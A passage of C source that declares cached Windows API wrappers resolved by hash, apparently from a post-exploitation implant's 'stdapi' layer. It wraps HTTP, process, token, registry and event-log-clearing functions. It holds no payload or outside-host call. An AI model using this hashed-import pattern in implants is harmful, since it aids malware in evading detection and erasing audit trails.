DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_InternetReadFile, WINAPI, WININET_DLL, H_InternetReadFile,
    (HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead),
    (hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_InternetCloseHandle, WINAPI, WININET_DLL, H_InternetCloseHandle,
    (HINTERNET hInternet), (hInternet), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_InternetCrackUrlW, WINAPI, WININET_DLL, H_InternetCrackUrlW,
    (LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents),
    (lpszUrl, dwUrlLength, dwFlags, lpUrlComponents), FALSE)

// END: wininet.dll
// START: wininet extensions.dll

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_HttpQueryInfoA, WINAPI, WININET_DLL, H_HttpQueryInfoA,
    (HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex),
    (hRequest, dwInfoLevel, lpBuffer, lpdwBufferLength, lpdwIndex), FALSE)

// END: wininet extensions.dll
// START: rpcrt4.dll

DEFINE_CACHED_WINAPI_WRAPPER(RPC_STATUS, winapi_rpcrt4_UuidCreate, RPC_ENTRY, RPCRT4_DLL, H_UuidCreate,
    (UUID* Uuid), (Uuid), RPC_S_INTERNAL_ERROR)

// END: rpcrt4.dll
// START: winhttp.dll

DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_winhttp_WinHttpOpen, WINAPI, WINHTTP_DLL, H_WinHttpOpen,
    (LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags),
    (pszAgentW, dwAccessType, pszProxyW, pszProxyBypassW, dwFlags), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_winhttp_WinHttpConnect, WINAPI, WINHTTP_DLL, H_WinHttpConnect,
    (HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved),
    (hSession, pswzServerName, nServerPort, dwReserved), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_winhttp_WinHttpOpenRequest, WINAPI, WINHTTP_DLL, H_WinHttpOpenRequest,
    (HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags),
    (hConnect, pwszVerb, pwszObjectName, pwszVersion, pwszReferrer, ppwszAcceptTypes, dwFlags), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpGetIEProxyConfigForCurrentUser, WINAPI, WINHTTP_DLL, H_WinHttpGetIEProxyConfigForCurrentUser,
    (WINHTTP_CURRENT_USER_IE_PROXY_CONFIG* pProxyConfig), (pProxyConfig), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpGetProxyForUrl, WINAPI, WINHTTP_DLL, H_WinHttpGetProxyForUrl,
    (HINTERNET hSession, LPCWSTR lpcwszUrl, WINHTTP_AUTOPROXY_OPTIONS* pAutoProxyOptions, WINHTTP_PROXY_INFO* pProxyInfo),
    (hSession, lpcwszUrl, pAutoProxyOptions, pProxyInfo), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpSetOption, WINAPI, WINHTTP_DLL, H_WinHttpSetOption,
    (HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength),
    (hInternet, dwOption, lpBuffer, dwBufferLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpSendRequest, WINAPI, WINHTTP_DLL, H_WinHttpSendRequest,
    (HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext),
    (hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength, dwTotalLength, dwContext), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpReceiveResponse, WINAPI, WINHTTP_DLL, H_WinHttpReceiveResponse,
    (HINTERNET hRequest, LPVOID lpReserved), (hRequest, lpReserved), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpQueryHeaders, WINAPI, WINHTTP_DLL, H_WinHttpQueryHeaders,
    (HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex),
    (hRequest, dwInfoLevel, pwszName, lpvBuffer, lpdwBufferLength, lpdwIndex), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpReadData, WINAPI, WINHTTP_DLL, H_WinHttpReadData,
    (HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead),
    (hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpQueryOption, WINAPI, WINHTTP_DLL, H_WinHttpQueryOption,
    (HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength),
    (hInternet, dwOption, lpBuffer, lpdwBufferLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpCrackUrl, WINAPI, WINHTTP_DLL, H_WinHttpCrackUrl,
    (LPCWSTR pwszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTS lpUrlComponents),
    (pwszUrl, dwUrlLength, dwFlags, lpUrlComponents), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpCloseHandle, WINAPI, WINHTTP_DLL, H_WinHttpCloseHandle,
    (HINTERNET hInternet), (hInternet), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winhttp_WinHttpWriteData, WINAPI, WINHTTP_DLL, H_WinHttpWriteData,
    (HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten),
    (hRequest, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten), FALSE)

// END: winhttp.dll

// START: expanded stdapi surface

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_CopyFileW, WINAPI, KERNEL32_DLL, H_CopyFileW,
    (LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists),
    (lpExistingFileName, lpNewFileName, bFailIfExists), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_CreateDirectoryW, WINAPI, KERNEL32_DLL, H_CreateDirectoryW,
    (LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes), (lpPathName, lpSecurityAttributes), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_DeleteFileA, WINAPI, KERNEL32_DLL, H_DeleteFileA,
    (LPCSTR lpFileName), (lpFileName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_DeleteFileW, WINAPI, KERNEL32_DLL, H_DeleteFileW,
    (LPCWSTR lpFileName), (lpFileName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_DisconnectNamedPipe, WINAPI, KERNEL32_DLL, H_DisconnectNamedPipe,
    (HANDLE hNamedPipe), (hNamedPipe), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_ExpandEnvironmentStringsA, WINAPI, KERNEL32_DLL, H_ExpandEnvironmentStringsA,
    (LPCSTR lpSrc, LPSTR lpDst, DWORD nSize), (lpSrc, lpDst, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_ExpandEnvironmentStringsW, WINAPI, KERNEL32_DLL, H_ExpandEnvironmentStringsW,
    (LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize), (lpSrc, lpDst, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_FileTimeToSystemTime, WINAPI, KERNEL32_DLL, H_FileTimeToSystemTime,
    (const FILETIME* lpFileTime, LPSYSTEMTIME lpSystemTime), (lpFileTime, lpSystemTime), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_FindClose, WINAPI, KERNEL32_DLL, H_FindClose,
    (HANDLE hFindFile), (hFindFile), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_FindFirstFileW, WINAPI, KERNEL32_DLL, H_FindFirstFileW,
    (LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData), (lpFileName, lpFindFileData), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_FindNextFileW, WINAPI, KERNEL32_DLL, H_FindNextFileW,
    (HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData), (hFindFile, lpFindFileData), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HRSRC, winapi_kernel32_FindResourceA, WINAPI, KERNEL32_DLL, H_FindResourceA,
    (HMODULE hModule, LPCSTR lpName, LPCSTR lpType), (hModule, lpName, lpType), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetCurrentDirectoryW, WINAPI, KERNEL32_DLL, H_GetCurrentDirectoryW,
    (DWORD nBufferLength, LPWSTR lpBuffer), (nBufferLength, lpBuffer), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetCurrentProcessId, WINAPI, KERNEL32_DLL, H_GetCurrentProcessId,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_GetDateFormatW, WINAPI, KERNEL32_DLL, H_GetDateFormatW,
    (LCID Locale, DWORD dwFlags, const SYSTEMTIME* lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate),
    (Locale, dwFlags, lpDate, lpFormat, lpDateStr, cchDate), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetDiskFreeSpaceExA, WINAPI, KERNEL32_DLL, H_GetDiskFreeSpaceExA,
    (LPCSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes),
    (lpDirectoryName, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(UINT, winapi_kernel32_GetDriveTypeA, WINAPI, KERNEL32_DLL, H_GetDriveTypeA,
    (LPCSTR lpRootPathName), (lpRootPathName), DRIVE_UNKNOWN)
DEFINE_CACHED_WINAPI_WRAPPER(UINT, winapi_kernel32_GetDriveTypeW, WINAPI, KERNEL32_DLL, H_GetDriveTypeW,
    (LPCWSTR lpRootPathName), (lpRootPathName), DRIVE_UNKNOWN)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetExitCodeThread, WINAPI, KERNEL32_DLL, H_GetExitCodeThread,
    (HANDLE hThread, LPDWORD lpExitCode), (hThread, lpExitCode), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetFileAttributesA, WINAPI, KERNEL32_DLL, H_GetFileAttributesA,
    (LPCSTR lpFileName), (lpFileName), INVALID_FILE_ATTRIBUTES)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetFileAttributesExW, WINAPI, KERNEL32_DLL, H_GetFileAttributesExW,
    (LPCWSTR lpFileName, GET_FILEEX_INFO_LEVELS fInfoLevelId, LPVOID lpFileInformation),
    (lpFileName, fInfoLevelId, lpFileInformation), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetFileAttributesW, WINAPI, KERNEL32_DLL, H_GetFileAttributesW,
    (LPCWSTR lpFileName), (lpFileName), INVALID_FILE_ATTRIBUTES)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetHandleInformation, WINAPI, KERNEL32_DLL, H_GetHandleInformation,
    (HANDLE hObject, LPDWORD lpdwFlags), (hObject, lpdwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetLogicalDriveStringsA, WINAPI, KERNEL32_DLL, H_GetLogicalDriveStringsA,
    (DWORD nBufferLength, LPSTR lpBuffer), (nBufferLength, lpBuffer), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetLogicalDrives, WINAPI, KERNEL32_DLL, H_GetLogicalDrives,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_WRAPPER(FARPROC, winapi_kernel32_GetProcAddress, WINAPI, KERNEL32_DLL, H_GetProcAddress,
    (HMODULE hModule, LPCSTR lpProcName), (hModule, lpProcName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(LCID, winapi_kernel32_GetSystemDefaultLCID, WINAPI, KERNEL32_DLL, H_GetSystemDefaultLCID,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetTickCount, WINAPI, KERNEL32_DLL, H_GetTickCount,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_GetTimeFormatW, WINAPI, KERNEL32_DLL, H_GetTimeFormatW,
    (LCID Locale, DWORD dwFlags, const SYSTEMTIME* lpTime, LPCWSTR lpFormat, LPWSTR lpTimeStr, int cchTime),
    (Locale, dwFlags, lpTime, lpFormat, lpTimeStr, cchTime), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetVersionExA, WINAPI, KERNEL32_DLL, H_GetVersionExA,
    (LPOSVERSIONINFOA lpVersionInformation), (lpVersionInformation), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HGLOBAL, winapi_kernel32_LoadResource, WINAPI, KERNEL32_DLL, H_LoadResource,
    (HMODULE hModule, HRSRC hResInfo), (hModule, hResInfo), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(LPVOID, winapi_kernel32_LockResource, WINAPI, KERNEL32_DLL, H_LockResource,
    (HGLOBAL hResData), (hResData), NULL)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_OutputDebugStringW, WINAPI, KERNEL32_DLL, H_OutputDebugStringW,
    (LPCWSTR lpOutputString), (lpOutputString))
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_MoveFileW, WINAPI, KERNEL32_DLL, H_MoveFileW,
    (LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName), (lpExistingFileName, lpNewFileName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_RemoveDirectoryW, WINAPI, KERNEL32_DLL, H_RemoveDirectoryW,
    (LPCWSTR lpPathName), (lpPathName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetCurrentDirectoryW, WINAPI, KERNEL32_DLL, H_SetCurrentDirectoryW,
    (LPCWSTR lpPathName), (lpPathName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetFileAttributesW, WINAPI, KERNEL32_DLL, H_SetFileAttributesW,
    (LPCWSTR lpFileName, DWORD dwFileAttributes), (lpFileName, dwFileAttributes), FALSE)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_SetLastError, WINAPI, KERNEL32_DLL, H_SetLastError,
    (DWORD dwErrCode), (dwErrCode))
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_SizeofResource, WINAPI, KERNEL32_DLL, H_SizeofResource,
    (HMODULE hModule, HRSRC hResInfo), (hModule, hResInfo), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_lstrcmpiW, WINAPI, KERNEL32_DLL, H_lstrcmpiW,
    (LPCWSTR lpString1, LPCWSTR lpString2), (lpString1, lpString2), 0)
DEFINE_CACHED_WINAPI_WRAPPER(LPWSTR, winapi_kernel32_lstrcpyW, WINAPI, KERNEL32_DLL, H_lstrcpyW,
    (LPWSTR lpString1, LPCWSTR lpString2), (lpString1, lpString2), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_lstrlenA, WINAPI, KERNEL32_DLL, H_lstrlenA,
    (LPCSTR lpString), (lpString), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_lstrlenW, WINAPI, KERNEL32_DLL, H_lstrlenW,
    (LPCWSTR lpString), (lpString), 0)

PVOID winapi_kernel32_InterlockedExchangePointer(PVOID volatile* Target, PVOID Value) {
    return InterlockedExchangePointer(Target, Value);
}
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_FormatMessageA, WINAPI, KERNEL32_DLL, H_FormatMessageA,
    (DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments),
    (dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_CreatePipe, WINAPI, KERNEL32_DLL, H_CreatePipe,
    (PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize),
    (hReadPipe, hWritePipe, lpPipeAttributes, nSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_CreateProcessW, WINAPI, KERNEL32_DLL, H_CreateProcessW,
    (LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation),
    (lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetComputerNameA, WINAPI, KERNEL32_DLL, H_GetComputerNameA,
    (LPSTR lpBuffer, LPDWORD nSize), (lpBuffer, nSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_GetCurrentProcess, WINAPI, KERNEL32_DLL, H_GetCurrentProcess,
    (VOID), (), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_GetCurrentThread, WINAPI, KERNEL32_DLL, H_GetCurrentThread,
    (VOID), (), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetEnvironmentVariableW, WINAPI, KERNEL32_DLL, H_GetEnvironmentVariableW,
    (LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize), (lpName, lpBuffer, nSize), 0)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_GetLocalTime, WINAPI, KERNEL32_DLL, H_GetLocalTime,
    (LPSYSTEMTIME lpSystemTime), (lpSystemTime))
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_GetLocaleInfoA, WINAPI, KERNEL32_DLL, H_GetLocaleInfoA,
    (LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData), (Locale, LCType, lpLCData, cchData), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetThreadContext, WINAPI, KERNEL32_DLL, H_GetThreadContext,
    (HANDLE hThread, LPCONTEXT lpContext), (hThread, lpContext), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetTimeZoneInformation, WINAPI, KERNEL32_DLL, H_GetTimeZoneInformation,
    (LPTIME_ZONE_INFORMATION lpTimeZoneInformation), (lpTimeZoneInformation), TIME_ZONE_ID_INVALID)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetThreadContext, WINAPI, KERNEL32_DLL, H_SetThreadContext,
    (HANDLE hThread, const CONTEXT* lpContext), (hThread, lpContext), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_TerminateProcess, WINAPI, KERNEL32_DLL, H_TerminateProcess,
    (HANDLE hProcess, UINT uExitCode), (hProcess, uExitCode), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualLock, WINAPI, KERNEL32_DLL, H_VirtualLock,
    (LPVOID lpAddress, SIZE_T dwSize), (lpAddress, dwSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualUnlock, WINAPI, KERNEL32_DLL, H_VirtualUnlock,
    (LPVOID lpAddress, SIZE_T dwSize), (lpAddress, dwSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_WaitForSingleObjectEx, WINAPI, KERNEL32_DLL, H_WaitForSingleObjectEx,
    (HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable), (hHandle, dwMilliseconds, bAlertable), WAIT_FAILED)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_RevertToSelf, WINAPI, ADVAPI32_DLL, H_RevertToSelf,
    (VOID), (), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_ClearEventLogA, WINAPI, ADVAPI32_DLL, H_ClearEventLogA,
    (HANDLE hEventLog, LPCSTR lpBackupFileName), (hEventLog, lpBackupFileName), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CloseEventLog, WINAPI, ADVAPI32_DLL, H_CloseEventLog,
    (HANDLE hEventLog), (hEventLog), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_ConvertSidToStringSidA, WINAPI, ADVAPI32_DLL, H_ConvertSidToStringSidA,
    (PSID Sid, LPSTR* StringSid), (Sid, StringSid), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CreateProcessAsUserW, WINAPI, ADVAPI32_DLL, H_CreateProcessAsUserW,
    (HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation),
    (hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_DuplicateTokenEx, WINAPI, ADVAPI32_DLL, H_DuplicateTokenEx,
    (HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken),
    (hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, phNewToken), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_GetNumberOfEventLogRecords, WINAPI, ADVAPI32_DLL, H_GetNumberOfEventLogRecords,
    (HANDLE hEventLog, PDWORD NumberOfRecords), (hEventLog, NumberOfRecords), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_GetOldestEventLogRecord, WINAPI, ADVAPI32_DLL, H_GetOldestEventLogRecord,
    (HANDLE hEventLog, PDWORD OldestRecord), (hEventLog, OldestRecord), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_GetTokenInformation, WINAPI, ADVAPI32_DLL, H_GetTokenInformation,
    (HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength),
    (TokenHandle, TokenInformationClass, TokenInformation, TokenInformationLength, ReturnLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_LookupAccountSidW, WINAPI, ADVAPI32_DLL, H_LookupAccountSidW,
    (LPCWSTR lpSystemName, PSID Sid, LPWSTR Name, LPDWORD cchName, LPWSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse),
    (lpSystemName, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_LookupPrivilegeValueA, WINAPI, ADVAPI32_DLL, H_LookupPrivilegeValueA,
    (LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid), (lpSystemName, lpName, lpLuid), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_advapi32_OpenEventLogA, WINAPI, ADVAPI32_DLL, H_OpenEventLogA,
    (LPCSTR lpUNCServerName, LPCSTR lpSourceName), (lpUNCServerName, lpSourceName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_ReadEventLogA, WINAPI, ADVAPI32_DLL, H_ReadEventLogA,
    (HANDLE hEventLog, DWORD dwReadFlags, DWORD dwRecordOffset, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, DWORD* pnBytesRead, DWORD* pnMinNumberOfBytesNeeded),
    (hEventLog, dwReadFlags, dwRecordOffset, lpBuffer, nNumberOfBytesToRead, pnBytesRead, pnMinNumberOfBytesNeeded), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegCloseKey, WINAPI, ADVAPI32_DLL, H_RegCloseKey,
    (HKEY hKey), (hKey), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegConnectRegistryW, WINAPI, ADVAPI32_DLL, H_RegConnectRegistryW,
    (LPCWSTR lpMachineName, HKEY hKey, PHKEY phkResult), (lpMachineName, hKey, phkResult), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegCreateKeyExW, WINAPI, ADVAPI32_DLL, H_RegCreateKeyExW,
    (HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition),
    (hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegDeleteKeyW, WINAPI, ADVAPI32_DLL, H_RegDeleteKeyW,
    (HKEY hKey, LPCWSTR lpSubKey), (hKey, lpSubKey), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegDeleteValueW, WINAPI, ADVAPI32_DLL, H_RegDeleteValueW,
    (HKEY hKey, LPCWSTR lpValueName), (hKey, lpValueName), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegEnumKeyW, WINAPI, ADVAPI32_DLL, H_RegEnumKeyW,
    (HKEY hKey, DWORD dwIndex, LPWSTR lpName, DWORD cchName), (hKey, dwIndex, lpName, cchName), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegEnumValueW, WINAPI, ADVAPI32_DLL, H_RegEnumValueW,
    (HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData),
    (hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegLoadKeyW, WINAPI, ADVAPI32_DLL, H_RegLoadKeyW,
    (HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpFile), (hKey, lpSubKey, lpFile), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegOpenKeyExW, WINAPI, ADVAPI32_DLL, H_RegOpenKeyExW,
    (HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult),
    (hKey, lpSubKey, ulOptions, samDesired, phkResult), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegQueryInfoKeyA, WINAPI, ADVAPI32_DLL, H_RegQueryInfoKeyA,
